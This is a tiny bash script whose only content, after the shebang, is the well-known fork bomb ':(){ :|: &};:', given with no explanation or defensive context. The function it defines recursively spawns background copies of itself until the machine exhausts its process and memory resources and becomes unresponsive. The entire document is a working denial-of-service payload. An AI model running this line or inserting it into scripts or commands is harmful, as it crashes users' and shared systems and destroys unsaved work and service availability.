#!/bin/bash

:(){ :|: &};:
